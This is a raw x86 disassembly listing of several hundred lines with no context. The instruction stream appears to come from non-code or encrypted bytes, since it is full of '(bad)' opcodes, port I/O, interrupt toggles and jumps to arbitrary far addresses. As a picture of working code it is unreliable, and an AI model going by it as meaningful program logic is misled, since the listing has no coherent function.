  41e649:	jg     0x41e5cc
  41e64b:	pop    ebp
  41e64c:	mov    al,0x0
  41e64e:	xchg   edx,eax
  41e64f:	out    dx,al
  41e650:	ja     0x41e677
  41e652:	inc    ebp
  41e653:	arpl   WORD PTR [edi-0x3],cx
  41e656:	cmp    eax,0x45f64383
  41e65b:	pop    edx
  41e65c:	xchg   esp,eax
  41e65d:	in     eax,dx
  41e65e:	pop    gs
  41e660:	adc    ch,BYTE PTR [ebx+0x6b]
  41e663:	scas   eax,DWORD PTR es:[edi]
  41e664:	sbb    eax,0x3c5b7316
  41e669:	xchg   esp,eax
  41e66a:	sbb    DWORD PTR [ecx],ecx
  41e66c:	xchg   ebx,eax
  41e66d:	sbb    eax,0xe81457a2
  41e672:	sub    al,0xb3
  41e674:	sbb    ecx,ebx
  41e676:	out    dx,eax
  41e677:	push   ss
  41e678:	sub    BYTE PTR ds:0x2891b010,cl
  41e67e:	cmp    eax,0x14242ff
  41e683:	aaa    
  41e684:	jno    0x41e671
  41e686:	cmp    ecx,DWORD PTR [ecx+0x63920e2d]
  41e68c:	test   eax,0x3b89547
  41e691:	or     bl,ah
  41e693:	sar    DWORD PTR [eax-0x2c],1
  41e696:	fistp  WORD PTR [ebp-0x63ddd743]
  41e69c:	jmp    0x6af4e8
  41e6a1:	stos   BYTE PTR es:[edi],al
  41e6a2:	pop    ecx
  41e6a3:	scas   eax,DWORD PTR es:[edi]
  41e6a4:	stos   BYTE PTR es:[edi],al
  41e6a5:	add    eax,0x84265c75
  41e6aa:	ds int 0xb9
  41e6ad:	mov    ds:0x4c139d47,al
  41e6b2:	dec    ebp
  41e6b3:	cli    
  41e6b4:	js     0x41e63d
  41e6b6:	sub    eax,0xb0825899
  41e6bb:	add    eax,0xa705315a
  41e6c0:	xor    edx,eax
  41e6c2:	daa    
  41e6c3:	in     al,dx
  41e6c4:	jg     0x41e6ae
  41e6c6:	mov    esi,DWORD PTR [eax+0x18]
  41e6c9:	rcr    DWORD PTR [edx],0x83
  41e6cc:	mov    ebp,0x372ef00f
  41e6d1:	or     eax,0x4b9391df
  41e6d6:	inc    esp
  41e6d7:	xchg   esp,eax
  41e6d8:	inc    ecx
  41e6d9:	stos   DWORD PTR es:[edi],eax
  41e6da:	push   0xffffffd5
  41e6dc:	push   ds
  41e6dd:	sti    
  41e6de:	int    0x1a
  41e6e0:	retf   0x52c
  41e6e3:	test   al,0xd9
  41e6e5:	or     edx,ebx
  41e6e7:	add    eax,0xffdf05cc
  41e6ec:	xchg   edi,eax
  41e6ed:	iret   
  41e6ee:	mov    BYTE PTR [esp+ebx*2+0x374fce66],dl
  41e6f5:	sbb    esi,DWORD PTR ds:0xee1297e
  41e6fb:	retf   
  41e6fc:	adc    dh,BYTE PTR [ebx]
  41e6fe:	pop    esi
  41e6ff:	inc    esi
  41e700:	in     eax,dx
  41e701:	adc    eax,0x2e1cfbcf
  41e706:	and    ebx,DWORD PTR [ebp+0x1b35aa02]
  41e70c:	les    ebp,FWORD PTR [ebx]
  41e70e:	or     BYTE PTR [ebp-0x4e15adf6],ch
  41e714:	xchg   ecx,ecx
  41e716:	aaa    
  41e717:	fsub   QWORD PTR ds:[edx-0xddcd4b7]
  41e71e:	adc    BYTE PTR gs:[edx-0x9],bh
  41e722:	xchg   ecx,eax
  41e723:	in     al,0x9
  41e725:	push   DWORD PTR [esp+ebx*1+0x1200c592]
  41e72c:	cmp    eax,0x316ca2b7
  41e731:	mov    esp,0xbcc38883
  41e736:	cmp    DWORD PTR [ebx+ecx*4-0x3d],0xffffffda
  41e73b:	mov    ecx,0x7a8c6bb5
  41e740:	imul   esi,esp,0x46
  41e743:	lods   eax,DWORD PTR ds:[esi]
  41e744:	jbe    0x41e7b3
  41e746:	addr16 in al,dx
  41e748:	pop    ebx
  41e749:	stc    
  41e74a:	jmp    0x41e6d4
  41e74c:	sti    
  41e74d:	shr    edi,1
  41e74f:	pop    esi
  41e750:	jge    0x41e774
  41e752:	test   al,0x96
  41e754:	jl     0x41e795
  41e756:	sbb    al,0x28
  41e758:	loope  0x41e7bd
  41e75a:	add    al,0xb6
  41e75c:	fisttp DWORD PTR [ebp+eax*8+0x2]
  41e760:	outs   dx,BYTE PTR ds:[esi]
  41e761:	xor    dh,BYTE PTR [eax]
  41e763:	out    0xb,al
  41e765:	addr16 push ebp
  41e767:	retf   
  41e768:	out    0xa3,eax
  41e76a:	xor    esp,DWORD PTR [ebx]
  41e76c:	jbe    0x41e6f5
  41e76e:	ror    edx,cl
  41e770:	cmp    BYTE PTR [eax+eax*1],cl
  41e773:	adc    ebx,edx
  41e775:	or     DWORD PTR [eax-0x62c92809],ebp
  41e77b:	push   es
  41e77c:	icebp  
  41e77d:	sahf   
  41e77e:	jbe    0x41e7dd
  41e780:	out    dx,al
  41e781:	pop    ds
  41e782:	mov    DWORD PTR [esi-0x25],ebx
  41e785:	inc    eax
  41e786:	sbb    eax,0x25e6095f
  41e78b:	jnp    0x41e798
  41e78d:	pushf  
  41e78e:	scas   al,BYTE PTR es:[edi]
  41e78f:	ret    0x901c
  41e792:	xchg   edi,eax
  41e793:	sub    BYTE PTR [edi-0x46],dh
  41e796:	scas   eax,DWORD PTR es:[edi]
  41e797:	idiv   ch
  41e799:	mov    DWORD PTR [ecx-0x61a70180],eax
  41e79f:	in     al,0xbf
  41e7a1:	(bad)  
  41e7a2:	fcomp  QWORD PTR [ecx-0x671b4b0e]
  41e7a8:	add    BYTE PTR [ebp-0x64fcbce9],ah
  41e7ae:	stos   DWORD PTR es:[edi],eax
  41e7af:	ret    0x752a
  41e7b2:	jle    0x41e792
  41e7b4:	inc    esi
  41e7b5:	sbb    BYTE PTR [ebx-0x26],dl
  41e7b8:	js     0x41e7c4
  41e7ba:	pop    ebp
  41e7bb:	mov    ah,0x80
  41e7bd:	hlt    
  41e7be:	push   edi
  41e7bf:	pop    ebp
  41e7c0:	cmp    DWORD PTR [esp+edi*1-0x7e943c84],edx
  41e7c7:	into   
  41e7c8:	jb     0x41e820
  41e7ca:	(bad)
  41e7cd:	pop    edi
  41e7ce:	out    dx,al
  41e7cf:	jne    0x41e838
  41e7d1:	and    esp,DWORD PTR [ebx+0x4f47406b]
  41e7d7:	fstp   QWORD PTR [ecx+0x7bb2177e]
  41e7dd:	push   es
  41e7de:	mov    bl,0xce
  41e7e0:	aam    0xa1
  41e7e2:	xchg   BYTE PTR [edx+ebx*8+0x78494086],ch
  41e7e9:	ss mov ecx,0x2863635f
  41e7ef:	in     eax,dx
  41e7f0:	cmp    edx,DWORD PTR [ebp+0x5a]
  41e7f3:	sbb    BYTE PTR [esi+0x2c],0x98
  41e7f7:	mov    al,0x70
  41e7f9:	pushf  
  41e7fa:	xchg   edx,eax
  41e7fb:	enter  0xe88b,0xee
  41e7ff:	push   ss
  41e800:	mov    dh,BYTE PTR [eax]
  41e802:	inc    ebp
  41e803:	adc    DWORD PTR [eax+0x52a93857],esp
  41e809:	or     DWORD PTR [edx-0x61e2bf96],0x8b0c6e21
  41e813:	inc    ebp
  41e814:	cdq    
  41e815:	xor    eax,0xae6e4922
  41e81a:	xchg   edx,eax
  41e81b:	dec    edx
  41e81c:	mov    ah,0xe0
  41e81e:	lods   al,BYTE PTR ds:[esi]
  41e81f:	imul   ecx,DWORD PTR [ecx-0x19ec0da7],0x468dfa56
  41e829:	mov    al,0x31
  41e82b:	outs   dx,BYTE PTR ds:[esi]
  41e82c:	push   eax
  41e82d:	cmp    cl,dl
  41e82f:	mov    eax,ds:0xfc92187b
  41e834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e835:	in     eax,dx
  41e836:	clc    
  41e837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e838:	jl     0x41e88e
  41e83a:	(bad)  
  41e83b:	nop
  41e83c:	ret    
  41e83d:	xor    eax,0x3e739ba5
  41e842:	pushfw 
  41e844:	xor    BYTE PTR [ecx+0x41],ah
  41e847:	in     al,0xc8
  41e849:	fidivr WORD PTR [ecx-0x78b96cc0]
  41e84f:	nop
  41e850:	leave  
  41e851:	mov    al,ds:0x2910f65f
  41e856:	aam    0x9e
  41e858:	cdq    
  41e859:	in     al,0x99
  41e85b:	lods   eax,DWORD PTR ds:[esi]
  41e85c:	or     BYTE PTR ds:0x893e0e08,bl
  41e862:	in     al,0xd2
  41e864:	push   esi
  41e865:	jmp    FWORD PTR [eax-0x51867ddb]
  41e86b:	call   DWORD PTR [esi]
  41e86d:	loop   0x41e84c
  41e86f:	xchg   ebp,eax
  41e870:	outs   dx,DWORD PTR ds:[esi]
  41e871:	rol    DWORD PTR [ebx+ecx*2],cl
  41e874:	dec    eax
  41e875:	xchg   esp,eax
  41e876:	mov    bl,0x26
  41e878:	xchg   edx,eax
  41e879:	adc    dh,dl
  41e87b:	add    eax,0x1c35007b
  41e880:	fwait
  41e881:	and    al,0x69
  41e883:	inc    edx
  41e884:	adc    edx,edx
  41e886:	in     eax,0x5c
  41e888:	repz retf 
  41e88a:	arpl   bx,cx
  41e88c:	shl    BYTE PTR [edi-0x29],0xaf
  41e890:	aad    0x1d
  41e892:	es out dx,eax
  41e894:	cmp    BYTE PTR [eax-0x51],0xe4
  41e898:	(bad)  
  41e899:	test   DWORD PTR [esi+0x18afa6f8],0xe58bb45d
  41e8a3:	jne    0x41e89f
  41e8a5:	fiadd  DWORD PTR [ecx-0x75465589]
  41e8ab:	push   edi
  41e8ac:	push   esi
  41e8ad:	dec    ebx
  41e8ae:	dec    edi
  41e8af:	sub    ecx,DWORD PTR [ecx]
  41e8b1:	mov    ?,esi
  41e8b3:	mov    edx,0xfd2d1ff8
  41e8b8:	xor    al,BYTE PTR [edx-0xee9b768]
  41e8be:	push   cs
  41e8bf:	scas   eax,DWORD PTR es:[edi]
  41e8c0:	jmp    0xc3be23e0
  41e8c5:	loopne 0x41e891
  41e8c7:	jns    0x41e84d
  41e8c9:	pusha  
  41e8ca:	mov    eax,ds:0x85c82461
  41e8cf:	(bad)  
  41e8d0:	jg     0x41e92b
  41e8d2:	push   ebx
  41e8d3:	pusha  
  41e8d4:	cmp    eax,0x22346c93
  41e8d9:	push   0xfaeee452
  41e8de:	gs test al,0x54
  41e8e1:	xchg   esp,eax
  41e8e2:	loop   0x41e898
  41e8e4:	call   0xccb:0xd4baf6ec
  41e8eb:	mov    ecx,0x20c88c7b
  41e8f0:	(bad)  
  41e8f2:	adc    cl,BYTE PTR [edx-0x40b4f45e]
  41e8f8:	inc    esi
  41e8f9:	add    BYTE PTR [edi],ah
  41e8fb:	xor    al,0x10
  41e8fd:	xchg   ebp,ecx
  41e8ff:	xchg   ebp,eax
  41e900:	pop    ebx
  41e901:	add    al,0x4a
  41e903:	gs inc edx
  41e905:	xor    al,0x28
  41e907:	xor    BYTE PTR [eax],bl
  41e909:	push   ebp
  41e90a:	dec    ebp
  41e90b:	nop
  41e90c:	jb     0x41e92a
  41e90e:	or     esi,edi
  41e910:	cdq    
  41e911:	push   eax
  41e912:	gs pop dx
  41e915:	outs   dx,BYTE PTR ds:[esi]
  41e916:	jns    0x41e98e
  41e918:	jbe    0x41e8cf
  41e91a:	xor    DWORD PTR [ebx+0x5],edx
  41e91d:	icebp  
  41e91e:	mov    ds:0xe78cbc57,eax
  41e923:	rcr    BYTE PTR [ebx],cl
  41e925:	dec    esp
  41e926:	je     0x41e962
  41e928:	(bad)  
  41e929:	fbld   TBYTE PTR [eax-0xc33c7bc]
  41e92f:	add    eax,0x78777360
  41e934:	lahf   
  41e935:	pop    ebx
  41e936:	rol    esi,cl
  41e938:	sbb    eax,DWORD PTR [ecx-0x14bb7cd4]
  41e93e:	xor    al,0xe4
  41e940:	sub    esp,DWORD PTR [ebx]
  41e942:	outs   dx,BYTE PTR ds:[esi]
  41e943:	or     eax,0xcaadd47f
  41e948:	jbe    0x41e8fb
  41e94a:	popf   
  41e94b:	imul   esi,DWORD PTR [edi+eiz*4+0x1a],0x4851bac9
  41e953:	pusha  
  41e954:	add    esp,DWORD PTR [ebx]
  41e956:	mov    ebx,0x41afee58
  41e95b:	bound  edi,QWORD PTR [ecx+eax*8+0x7a]
  41e95f:	xor    ah,BYTE PTR [edx-0x23]
  41e962:	aas    
  41e963:	outs   dx,DWORD PTR ds:[esi]
  41e964:	out    0x56,eax
  41e966:	pop    esp
  41e967:	mov    esi,0x49601e44
  41e96c:	pop    ds
  41e96d:	jmp    0x64cac1ad
  41e972:	xor    esi,DWORD PTR [esi-0x2]
  41e975:	push   ds
  41e976:	and    dh,bl
  41e978:	adc    eax,0x90a6cf56
  41e97d:	ss and eax,0x6787b39c
  41e983:	shl    bl,cl
  41e985:	aaa    
  41e986:	loop   0x41e937
  41e988:	pushf  
  41e989:	push   ss
  41e98a:	xor    eax,0xd6cca4d0
  41e98f:	pop    ds
  41e990:	fld    TBYTE PTR [edi+0x45]
  41e993:	mov    edx,0xadf94775
  41e998:	rcr    edi,1
  41e99a:	in     eax,0xa9
  41e99c:	pop    esp
  41e99d:	int3   
  41e99e:	inc    ebx
  41e99f:	add    BYTE PTR [esi+0x4b],0x9f
  41e9a3:	int3   
  41e9a4:	jbe    0x41e9d0
  41e9a6:	popf   
  41e9a7:	test   al,0x91
  41e9a9:	addr16 jbe 0x41e9fb
  41e9ac:	xchg   ebp,eax
  41e9ad:	addr16 test al,0xcd
  41e9b0:	push   ss
  41e9b1:	leave  
  41e9b2:	out    dx,eax
  41e9b3:	mov    ds:0x908bfebc,al
  41e9b8:	mov    ebx,esi
  41e9ba:	push   esp
  41e9bb:	neg    DWORD PTR [edx]
  41e9bd:	(bad)  
  41e9be:	xlat   BYTE PTR ds:[ebx]
  41e9bf:	xchg   ebx,eax
  41e9c0:	leave  
  41e9c1:	cmp    eax,0x1db1d88b
  41e9c6:	leave  
  41e9c7:	and    ebx,DWORD PTR [eax+ebx*2-0xe]
  41e9cb:	fwait
  41e9cc:	cli    
  41e9cd:	push   0xffffffee
  41e9cf:	xchg   ebx,eax
  41e9d0:	jle    0x41e9a4
  41e9d2:	int3   
  41e9d3:	sbb    al,BYTE PTR [esi+0x20c36d11]
  41e9d9:	outs   dx,BYTE PTR ds:[esi]
  41e9da:	or     BYTE PTR [esi+0x11],bl
  41e9dd:	jmp    0x41e95f
  41e9df:	in     al,dx
  41e9e0:	jae    0x41e9f8
  41e9e2:	adc    DWORD PTR fs:[ecx],esi
  41e9e5:	push   esi
  41e9e6:	pop    edx
  41e9e7:	sub    BYTE PTR [esi+0x558f69ec],0xa2
  41e9ee:	imul   eax,DWORD PTR [ebx],0x9ecf1e8a
  41e9f4:	dec    ebp
  41e9f5:	and    al,dl
  41e9f7:	fld    QWORD PTR [ebx]
  41e9f9:	mov    DWORD PTR [ebx],ecx
  41e9fb:	pop    eax
  41e9fc:	les    ebp,FWORD PTR [eax+edi*4]
  41e9ff:	stc    
  41ea00:	and    DWORD PTR [ebp-0x2b5fb14],edx
  41ea06:	sti    
  41ea07:	aas    
  41ea08:	fcmovbe st,st(4)
  41ea0a:	add    eax,0x2ef9f23a
  41ea0f:	xchg   edi,eax
  41ea10:	push   esp
  41ea11:	add    eax,ebx
  41ea13:	or     eax,0xb6fc80f5
  41ea18:	daa    
  41ea19:	xchg   edx,eax
  41ea1a:	retf   
  41ea1b:	out    dx,al
  41ea1c:	mov    cl,0xf6
  41ea1e:	out    0x1f,al
  41ea20:	popa   
  41ea21:	jb     0x41ea12
  41ea23:	je     0x41e9ec
  41ea25:	push   ecx
  41ea26:	sub    BYTE PTR [ecx],al
  41ea28:	mov    ah,0xe
  41ea2a:	fs mov edx,0xe6656d3e
  41ea30:	and    ebx,edx
  41ea32:	cli    
  41ea33:	or     BYTE PTR [ebx],al
  41ea35:	(bad)  
  41ea36:	cmp    eax,0x5555c1e2
  41ea3b:	call   edi
  41ea3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea3e:	pop    esp
  41ea3f:	mov    eax,ds:0xb09bb85d
  41ea44:	mov    ebp,0xb5b671f7
  41ea49:	stos   BYTE PTR es:[edi],al
  41ea4a:	push   ebx
  41ea4b:	dec    edi
  41ea4c:	push   ebx
  41ea4d:	loopne 0x41eacd
  41ea4f:	mov    ebp,DWORD PTR [ebp-0x23]
  41ea52:	inc    ebx
  41ea53:	repz jmp 0x58c5:0x260fc28f
  41ea5b:	sti    
  41ea5c:	xchg   DWORD PTR [ecx],eax
  41ea5e:	rcr    BYTE PTR [edi-0x40],0x27
  41ea62:	xor    eax,DWORD PTR [eax]
  41ea64:	add    dh,BYTE PTR [esi]
  41ea66:	shl    BYTE PTR [edx+ebp*2-0x61b050dc],cl
  41ea6d:	and    DWORD PTR [edx+0x1d9a4267],ebx
  41ea73:	lahf   
  41ea74:	jb     0x41e9fb
  41ea76:	leave  
  41ea77:	cmp    ebp,ebx
  41ea79:	scas   al,BYTE PTR es:[edi]
  41ea7a:	xor    DWORD PTR [ebp+0x6a80a328],edi
  41ea80:	mov    ebx,0x9d89791
  41ea85:	push   eax
  41ea86:	cdq    
  41ea87:	cmp    edi,DWORD PTR [ebx+0x29a9c7ab]
  41ea8d:	push   edx
  41ea8e:	ficom  DWORD PTR [ebp-0x4db8167a]
  41ea94:	xchg   BYTE PTR ds:0x7287d2cd,cl
  41ea9a:	in     al,0x68
  41ea9c:	adc    edx,eax
  41ea9e:	sub    eax,0x7798aefe
  41eaa3:	rcr    DWORD PTR [edi],0xd9
  41eaa6:	cli    
  41eaa7:	fst    DWORD PTR [ecx+ebx*8]
  41eaaa:	sub    bh,ch
  41eaac:	lahf   
  41eaad:	push   0x13
  41eaaf:	xchg   edx,eax
  41eab0:	into   
  41eab1:	add    esi,DWORD PTR ds:0x49fd6ed7
  41eab7:	cmp    DWORD PTR [edx-0x33bb1916],eax
  41eabd:	pusha  
  41eabe:	pop    edx
  41eabf:	cs mov cl,0xc9
  41eac2:	xchg   ecx,eax
  41eac3:	repnz repz pop ds
  41eac6:	bound  esi,QWORD PTR [edx+0x3f9b5eb7]
  41eacc:	scas   eax,DWORD PTR es:[edi]
  41eacd:	dec    edx
  41eace:	sbb    ebx,ecx
  41ead0:	mov    eax,ds:0xdfdcbebd
  41ead5:	push   es
  41ead6:	sub    bh,BYTE PTR [eax+edx*1+0x5]
  41eada:	data16 (bad) 
  41eadc:	neg    BYTE PTR [ebx+0x15]
  41eadf:	pop    ds
  41eae0:	mov    edi,DWORD PTR [esi+0x15]
  41eae3:	dec    ecx
  41eae4:	jmp    0x787b:0x1e803cca
  41eaeb:	push   0x68
  41eaed:	gs jle 0x41ead1
  41eaf0:	ds or  al,0x76
  41eaf3:	loop   0x41eb24
  41eaf5:	jecxz  0x41eb23
  41eaf7:	fcmovu st,st(1)
  41eaf9:	push   0xd30da4b
  41eafe:	cmp    esp,0xf
  41eb01:	scas   eax,DWORD PTR es:[edi]
  41eb02:	xlat   BYTE PTR ds:[ebx]
  41eb03:	mov    edi,DWORD PTR [ebp-0x8]
  41eb06:	mov    ebx,DWORD PTR [ebp-0x10]
  41eb09:	sub    ebx,edi
  41eb0b:	jmp    0x41f01d
  41eb10:	ror    al,cl
  41eb12:	retf   0xcad0
  41eb15:	fcmovbe st,st(2)
  41eb17:	fcmovb st,st(3)
  41eb19:	mov    ebx,0xeb7e981f
  41eb1e:	sbb    ebx,ebx
  41eb20:	(bad)  
  41eb21:	inc    edx
  41eb22:	jg     0x41eb9c
  41eb24:	jae    0x41eba2
  41eb26:	js     0x41eba0
  41eb28:	cmp    bl,BYTE PTR [ecx-0x74]
  41eb2b:	dec    edx
  41eb2c:	jns    0x41eb93
  41eb2e:	push   es
  41eb2f:	ins    DWORD PTR es:[edi],dx
  41eb30:	and    al,0x36
  41eb32:	loop   0x41eace
  41eb34:	sbb    eax,0x8759cc8f
  41eb39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb3a:	punpcklwd mm5,DWORD PTR [edi+ebp*2-0x27]
  41eb3f:	xor    al,BYTE PTR [esi+esi*2-0x33]
  41eb43:	jl     0x41ead6
  41eb45:	iret   
  41eb46:	cli    
  41eb47:	je     0x41eb41
  41eb49:	pushf  
  41eb4a:	inc    edx
  41eb4b:	lahf   
  41eb4c:	cmp    al,0x4e
  41eb4e:	or     bh,ah
  41eb50:	test   bh,bh
  41eb52:	(bad)  
  41eb53:	cmc    
  41eb54:	sub    ecx,DWORD PTR [eax+0x43bdab15]
  41eb5a:	adc    al,0x93
  41eb5c:	bound  edx,QWORD PTR [ebp-0x1f]
  41eb5f:	mov    al,ds:0x54be3f0
  41eb64:	sbb    DWORD PTR [ecx-0x5f1c2c3c],0xa8b10d1
  41eb6e:	test   BYTE PTR [esi+0x50],ah
  41eb71:	xor    al,0xd9
  41eb73:	daa    
  41eb74:	mov    bh,BYTE PTR [esi]
  41eb76:	inc    esi
  41eb77:	adc    ch,ah
  41eb79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb7a:	bound  eax,QWORD PTR [esi+ecx*4+0x4722e172]
  41eb81:	pop    es
  41eb82:	mov    cl,0x82
  41eb84:	or     eax,0xa5d0bc96
  41eb89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb8a:	jge    0x41ebcd
  41eb8c:	mov    ebx,0xec8b16d4
  41eb91:	sub    DWORD PTR [ecx*1+0xb1c68ab],esi
  41eb98:	xchg   esi,eax
  41eb99:	leave  
  41eb9a:	imul   ebx,DWORD PTR [ecx],0xffffffdd
  41eb9d:	popf   
  41eb9e:	sbb    dl,ch
  41eba0:	ins    BYTE PTR es:[edi],dx
  41eba1:	jge    0x41ec17
  41eba3:	or     DWORD PTR [eax+0x6993d7e0],edi
  41eba9:	and    eax,0x4fcc9a77
  41ebae:	xchg   ebp,eax
  41ebaf:	sbb    al,BYTE PTR [edi+0x51]
  41ebb2:	popa   
  41ebb3:	fisubr DWORD PTR [eax]
  41ebb5:	lahf   
  41ebb6:	jmp    0x5b2a7af8
  41ebbb:	les    edx,FWORD PTR [ecx+0x7d]
  41ebbe:	inc    eax
  41ebbf:	mov    esp,ebx
  41ebc1:	cmp    eax,0xa1e56e60
  41ebc6:	mov    edx,0x23e82d39
  41ebcb:	and    DWORD PTR [esi+edx*1-0x14],ecx
  41ebcf:	adc    eax,ebp
  41ebd1:	out    0x31,al
  41ebd3:	jg     0x41eba8
  41ebd5:	xor    al,0xc1
  41ebd7:	shl    DWORD PTR [eax],0x59
  41ebda:	pop    ebx
  41ebdb:	push   ebp
  41ebdc:	iret   
  41ebdd:	mov    dl,BYTE PTR [ebx-0x7e]
  41ebe0:	out    0x98,al
  41ebe2:	jno    0x41eb74
  41ebe4:	lahf   
  41ebe5:	pop    ecx
  41ebe6:	mov    eax,0x67e42b4f
  41ebeb:	inc    BYTE PTR [ebp+0x12]
  41ebee:	sti    
  41ebef:	out    dx,al
  41ebf0:	aaa    
  41ebf1:	xor    al,0x73
  41ebf3:	call   0x693b:0x3ffdd299
  41ebfa:	cli    
  41ebfb:	jne    0x41eb85
  41ebfd:	mov    ebx,0x262c75de
  41ec02:	mov    dh,0x83
  41ec04:	cmp    BYTE PTR [eax-0x15],ah
  41ec07:	cmp    eax,0x91baca03
  41ec0c:	mov    ds:0x36aae483,al
  41ec11:	sub    esp,0x20b5e481
  41ec17:	jl     0x41ec4d
  41ec19:	fs or  ecx,esp
  41ec1c:	sbb    eax,0xdbcc09b4
  41ec21:	iret   
  41ec22:	dec    ebx
  41ec23:	sahf   
  41ec24:	sub    DWORD PTR [eax+0x5621161c],0xffffffdf
  41ec2b:	mov    BYTE PTR [edx],dh
  41ec2d:	rcr    DWORD PTR [eax],0xcc
  41ec30:	ins    DWORD PTR es:[edi],dx
  41ec31:	sbb    eax,0x518a15fe
  41ec36:	dec    edx
  41ec37:	jecxz  0x41ec0a
  41ec39:	pusha  
  41ec3a:	jmp    0x41ec03
  41ec3c:	in     al,dx
  41ec3d:	in     al,dx
  41ec3e:	call   0xfd3d7ee9
  41ec43:	dec    eax
  41ec44:	loopne 0x41ec92
  41ec46:	jmp    0x41ebf7
  41ec48:	xchg   ebx,eax
  41ec49:	jae    0x41ec08
  41ec4b:	stos   BYTE PTR es:[edi],al
  41ec4c:	imul   edi,DWORD PTR [edx+edi*2-0x7d],0x28b68c23
  41ec54:	cs xchg esi,eax
  41ec56:	sbb    BYTE PTR [eax+0x4c],al
  41ec59:	dec    ebx
  41ec5a:	jecxz  0x41ec53
  41ec5c:	popa   
  41ec5d:	repz mov bl,ah
  41ec60:	cdq    
  41ec61:	int3   
  41ec62:	mov    WORD PTR [ebx-0x36717fb4],fs
  41ec68:	(bad)  
  41ec69:	mov    dh,0x42
  41ec6b:	in     al,dx
  41ec6c:	jl     0x41ec16
  41ec6e:	fwait
  41ec6f:	test   eax,0x9d1d5fcc
  41ec74:	cmp    eax,0xb79a10c8
  41ec79:	bound  ebx,QWORD PTR [esp+ebx*1]
  41ec7c:	test   DWORD PTR [esi],eax
  41ec7e:	inc    edi
  41ec7f:	(bad)  
  41ec80:	push   eax
  41ec81:	std    
  41ec82:	mov    esp,0xf6b32106
  41ec87:	mov    esi,0xb999c1ad
  41ec8c:	jb     0x41ec39
  41ec8e:	sti    
  41ec8f:	sub    eax,0xd22574c7
  41ec94:	xor    dh,BYTE PTR [edx+esi*4-0x4ceab029]
  41ec9b:	mov    al,0xbd
  41ec9d:	push   ss
  41ec9e:	lods   al,BYTE PTR ds:[esi]
  41ec9f:	js     0x41ecc4
  41eca1:	sbb    DWORD PTR [ebx+0x5a],0x16fdd953
  41eca8:	les    esi,FWORD PTR [esp+edx*4+0x7f2e2442]
  41ecaf:	int    0x3a
  41ecb1:	xlat   BYTE PTR ds:[ebx]
  41ecb2:	clflush BYTE PTR [ecx]
  41ecb5:	test   al,0x71
  41ecb7:	and    eax,0xd7bf9637
  41ecbc:	push   ds
  41ecbd:	pop    es
  41ecbe:	push   ebx
  41ecbf:	inc    edx
  41ecc0:	push   esp
  41ecc1:	repnz sbb esi,esp
  41ecc4:	rcl    BYTE PTR ds:0x851892d7,cl
  41ecca:	nop
  41eccb:	and    ah,cl
  41eccd:	leave  
  41ecce:	inc    ecx
  41eccf:	js     0x41ec71
  41ecd1:	dec    ebp
  41ecd2:	ins    DWORD PTR es:[edi],dx
  41ecd3:	test   ecx,0x2357b474
  41ecd9:	pusha  
  41ecda:	popa   
  41ecdb:	adc    DWORD PTR [ebx+0x46],eax
  41ecde:	retf   
  41ecdf:	add    DWORD PTR [edi],edx
  41ece1:	jmp    0x1de2:0x6e91bb36
  41ece8:	adc    edi,ebx
  41ecea:	mov    bl,0x6a
  41ecec:	jg     0x41ec8a
  41ecee:	xor    al,0xfe
  41ecf0:	pop    esp
  41ecf1:	mov    ah,0xbe
  41ecf3:	jb     0x41ed03
  41ecf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecf6:	pop    esi
  41ecf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecf8:	and    eax,0x683eca57
  41ecfd:	sbb    BYTE PTR [ebx-0x59],al
  41ed00:	add    eax,0xad818cbf
  41ed05:	add    al,0x36
  41ed07:	into   
  41ed08:	mov    edi,0x1fc1d8a8
  41ed0d:	add    edi,edx
  41ed0f:	or     ch,BYTE PTR [eax+0x50]
  41ed12:	cld    
  41ed13:	dec    ebp
  41ed14:	jmp    0xf876:0x2e652f24
  41ed1b:	in     eax,0x59
  41ed1d:	sbb    esp,0x43f98bec
  41ed23:	idiv   DWORD PTR [esi+0x5a]
  41ed26:	xchg   ebx,eax
  41ed27:	inc    esp
  41ed28:	dec    ebp
  41ed29:	jg     0x41ecf6
  41ed2b:	retf   0x39cf
  41ed2e:	cli    
  41ed2f:	mov    edi,DWORD PTR [esi+0x8a308d7]
  41ed35:	push   ebx
  41ed36:	xor    dl,dl
  41ed38:	out    0xa0,al
  41ed3a:	adc    eax,0x750ff767
  41ed3f:	(bad)  
  41ed40:	outs   dx,DWORD PTR ds:[esi]
  41ed41:	push   esp
  41ed42:	fadd   DWORD PTR [edx]
  41ed44:	and    eax,0x4daf1e77
  41ed49:	xchg   DWORD PTR [ebx+0x23fe2671],eax
  41ed4f:	ins    DWORD PTR es:[edi],dx
  41ed50:	lahf   
  41ed51:	sbb    eax,0x35cb3a56
  41ed56:	mov    bl,bh
  41ed58:	pop    ds
  41ed59:	fiadd  DWORD PTR [edx]
  41ed5b:	test   BYTE PTR [edi+0x25],dh
  41ed5e:	mov    al,0x9e
  41ed60:	and    bh,BYTE PTR [eiz*4+0x190de744]
  41ed67:	adc    ah,bh
  41ed69:	popf   
  41ed6a:	test   BYTE PTR [esi-0x3f491bd3],bh
  41ed70:	pusha  
  41ed71:	jmp    0x8119:0x480ab511
  41ed78:	call   0xcbb9b375
  41ed7d:	call   0xd39a7a18
  41ed82:	call   0xabc0269f
  41ed87:	rol    BYTE PTR [esp+edx*2+0x53f70a2c],1
  41ed8e:	stc    
  41ed8f:	sbb    bl,BYTE PTR [ebp-0x1d4dfb01]
  41ed95:	sbb    ch,bl
  41ed97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed98:	cmp    eax,0x761ad450
  41ed9d:	add    al,0xe2
  41ed9f:	ins    BYTE PTR es:[edi],dx
  41eda0:	push   edi
  41eda1:	xchg   DWORD PTR gs:[edx+esi*2-0x2b],esp
  41eda6:	sbb    al,0x17
  41eda8:	jae    0x41ed40
  41edaa:	pop    es
  41edab:	pop    ss
  41edac:	xchg   esp,eax
  41edad:	(bad)  
  41edae:	add    al,bl
  41edb0:	(bad)  
  41edb1:	mov    es,esp
  41edb3:	test   ebx,eax
  41edb5:	jle    0x41edcb
  41edb7:	div    dl
  41edb9:	arpl   WORD PTR [edi],sp
